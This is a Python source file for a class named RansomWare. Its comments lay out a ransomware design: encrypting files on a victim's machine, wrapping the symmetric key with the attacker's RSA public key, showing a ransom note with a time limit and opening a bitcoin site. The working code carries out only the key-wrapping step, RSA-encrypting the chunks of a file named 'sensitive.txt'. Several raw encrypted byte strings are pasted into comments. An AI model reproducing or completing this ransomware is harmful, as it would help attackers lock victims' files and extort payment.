# Imports
# from cryptography.fernet import Fernet # encrypt/decrypt files on target system
# import os # to get system root
# import webbrowser # to load webbrowser to go to specific website eg bitcoin
# import ctypes # so we can intereact with windows dlls and change windows background etc
# import urllib.request # used for downloading and saving background image
# import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
# import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
# import datetime # to give time limit on ransom note
# import subprocess # to create process for notepad and open ransom  note
# import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
# import base64
# import threading # used for ransom note and decryption key on dekstop



class RansomWare:

    def __init__(self):
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.

        # b"\xa0\x87?6\xcc\x8d\x97\xcfNo\xdc'w\xbc\x98\xf9\x138\xd5;\xaa\x9fg'Q\x95\xe2\rF\x9dy\xf2\x17D\xd8\x03\xfec\xe11\x12\x07\x12\xb1\xfc\xdc\xfa\x19\xcb\xdd\x9e\xd9=cv\xe9"


    def encrypt_fernet_key(self):
        with open('sensitive.txt', 'rb') as fk:
            text = fk.read()
            print(text)
        for i in range(0,len(text),80):
                # Public RSA key
                self.public_key = RSA.importKey(open('public_key').read())
                # Public encrypter object
                public_crypter =  PKCS1_OAEP.new(self.public_key)
                # Encrypted fernet key
                enc_fernent_key = public_crypter.encrypt(text[i:i+80])
                # Write encrypted fernet key to file
                # f.write(enc_fernent_key)
                print(enc_fernent_key)
                # temp=temp+","+enc_fernent_key
                with open('./data/enc-'+str(i)+'.txt', 'wb') as ff:
                    ff.write(enc_fernent_key)

# b'\x11\x82m\xc2\xeaV\xe8\xb5\xed\xf3\x1c\x04$2\x8f/\xc7\x1c\xf5\x10H\xb2\xb6ML%\xae\x95?Q\xd7\xa7<\x029\xa9Xh\xaf\xf2\x9d\xf1\xce\xdc\x88h:\xe8\xf2\x8e\x93\x92t\xae_\x00\x0c\n\xc7\xb9\xcf\xe6\xd8\x8d\x07\x90\xb2\t\xc6\xc8\x8b\x0e\xe4s+\x1e\x17M>\x13\xfb\xd7F\x97\xee?Em\xd6\x1cD\xd3\x0f@M\xb6\x84ww\xcdB\x96\xb5c1\x8d\xb2\xdf\xf8\xcfY\x13\xb4\x89\x94:\xc8F\xd7L\xc8\x181\xd5%\x05h2u?\xee$\r<nj\xbe\x93\xf5;A"8aN#\x14N\xd5I\\\\\xba\x9f\x1d\xbb\x89\xfe\xcbv\x92\x07\xe10\x00u\x1b\x11\xd4\x1f\x92=\xa9+t\x0bqn\xdb\xb0U\xe856\xbe\xc5\xb4e>\xd9\xa8\x15\xc3)\x16l\xca$\x02U{U"\xb2\x94\xe8\xe6\r\xcb^\xce\xd9\x9f#$\xaf\x81iB\xea\xb2\xb1\x18\xca\x0f\xaf\x14`\xd1\x90\x89\xb5\x0c\x17\xce\xe0\xd1\xc1\tb\xa3\xa5\x02\xae\x8b\x89\xb82\x9a\xca4\xd0\x96\xc4\xce>6\xdb\xb1\x9a\x8e;F\xfeN\x98J-@\xb7#i\xa8x\x04.\xae\xfb\xa7\x1c\xb0=\xd2\xcd\x0c\xa6\xa8\xf3(o.\xd2E\x17*\xb8\xd5\xff\x7f\'w\xdb\xe0\x97\xc7\x1f\xf9<\x89s\xde\xf1\xc9\xd3\x11\xcf\xde\x8b[\xe1+\xec\x02\xf4y\xdb"\x8d&;\xbeV\xd7H\xcfc\xb1\xe5\x92^g\xab\x04\x08\xb2\xf6o\xf3>Y\x85\xf4\xae\x17HB\x88\x12[\xab\xc5\xfbt@\x0b\xfdP\xb1\x88\xe3\xf5\x026\x86\x0f\xf0\x86\xc3x\xc9\x0eX\xff\xbf'





def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.encrypt_fernet_key()

if __name__ == '__main__':
    main()
 
